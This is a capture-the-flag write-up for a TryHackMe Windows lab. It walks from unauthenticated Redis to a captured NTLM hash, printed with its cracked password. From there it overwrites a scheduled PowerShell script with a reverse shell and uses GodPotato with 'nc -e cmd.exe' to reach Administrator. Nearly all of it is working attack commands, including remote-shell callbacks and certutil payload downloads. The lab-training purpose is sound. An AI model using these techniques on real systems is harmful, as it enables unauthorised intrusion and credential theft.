---
tags:
  - THM
  - Windows
  - Medium
  - Responder
  - Brute-Force
  - Cron
  - RCE
  - SeImpersonatePrivilege
---
https://tryhackme.com/room/vulnnetactive/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.133.153 vulnnet.local
```
# Scanning
```console
$ nmap -p53,135,139,445,464,6379,9389,49666,49668,49669,49670,49677,49691 -sV -sC vulnnet.local

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-28T19:04:35
|_  start_date: N/A
|_clock-skew: -1s
```
# Abusing Redis

[Redis](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html) service does not require authentication:
```console
$ nc vulnnet.local 6379
info
$1791
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
...
```

Prepare to capture hashes using `responder`:
```console
$ responder -I tun0
```

Set a directory to our own machine to capture a hash, we save it in `hash` file:
```console
$ nc vulnnet.local 6379
config set dir \\192.168.150.216\share
```

Crack that hash:
```console
$ hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
...
ENTERPRISE-SECURITY::VULNNET:58a2aa3e9964bf5a:cb27384add7b0048d81d679279cf535d:0101000000000000001ba1b8bbbedc01083603b75e4426900000000002000800520032004e00350001001e00570049004e002d003000320038005700570041004a00320051005200530004003400570049004e002d003000320038005700570041004a0032005100520053002e00520032004e0035002e004c004f00430041004c0003001400520032004e0035002e004c004f00430041004c0005001400520032004e0035002e004c004f00430041004c0007000800001ba1b8bbbedc01060004000200000008003000300000000000000000000000003000005ddca180212cf1e63689cee00cc54fd1231e4d9499f76c2b5ca721ff39be67970a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350030002e003200310036000000000000000000:sand_0873959498
...
```

# Scheduled Task

Using the previous credentials, now we can log in to SMB to see network shares:
```console
$ nxc smb vulnnet.local -u 'enterprise-security' -p 'sand_0873959498' --shares

SMB         10.65.133.153   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.133.153   445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.65.133.153   445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         10.65.133.153   445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.65.133.153   445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         10.65.133.153   445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         10.65.133.153   445    VULNNET-BC3TCK1  C$                              Default share
SMB         10.65.133.153   445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE      
SMB         10.65.133.153   445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         10.65.133.153   445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.65.133.153   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share 
```

Connected to the only writable share and found a PowerShell file:
```console
$ smbclient -U 'enterprise-security%sand_0873959498' //vulnnet.local/Enterprise-Share
smb: \> ls
  .                                   D        0  Sat Mar 28 20:55:19 2026
  ..                                  D        0  Sat Mar 28 20:55:19 2026
  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 18:33:18 2021

		9558271 blocks of size 4096. 5081239 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Looks like a PowerShell script which is run in between intervals of time:
```powershell
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

Since we can write on the share, we replace the file with [Nishang's TCP PowerShell](https://github.com/samratashok/nishang):
```console
$ curl -s -o 'PurgeIrrelevantData_1826.ps1' 'https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1'

$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 192.168.150.216 -Port 443' >> PurgeIrrelevantData_1826.ps1

$ smbclient -U 'enterprise-security%sand_0873959498' //vulnnet.local/Enterprise-Share
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (6.4 kB/s) (average 6.4 kB/s)
```

Finally, listen for connections and get the **user flag**:
```console
$ rlwrap ncat -lvnp 443

PS> type C:\Users\enterprise-security\Desktop\user.txt
```

# Privilege Escalation

We have the **SeImpersonatePrivilege**:
```console
PS> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We download the necessary tools in our local machine and share them via Python:
```console
$ wget 'https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip'

$ 7z x netcat-win32-1.11.zip

$ mv netcat-1.11/nc64.exe nc.exe

$ rm -rf netcat-win32-1.11.zip netcat-1.11/

$ wget 'https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe'

$ ls
GodPotato-NET4.exe  nc.exe

$ python3 -m http.server 8000
```

We transfer Netcat and the Potato exploit to the target machine:
```console
PS> mkdir C:\Windows\Temp\privesc

PS> cd C:\Windows\Temp\privesc

PS> certutil.exe -urlcache -split -f 'http://192.168.150.216:8000/GodPotato-NET4.exe'

PS> certutil.exe -urlcache -split -f 'http://192.168.150.216:8000/nc.exe'
```

Listen for connections:
```console
$ rlwrap ncat -lvnp 443
```

Get a shell as **Administrator**:
```console
PS> cd C:\Windows\Temp\privesc\

PS> .\GodPotato-NET4.exe -cmd 'nc.exe -t -e cmd.exe 192.168.150.216 443'
```

Get the **Administrator flag**:
```console
C:\> type C:\Users\Administrator\Desktop\system.txt
```
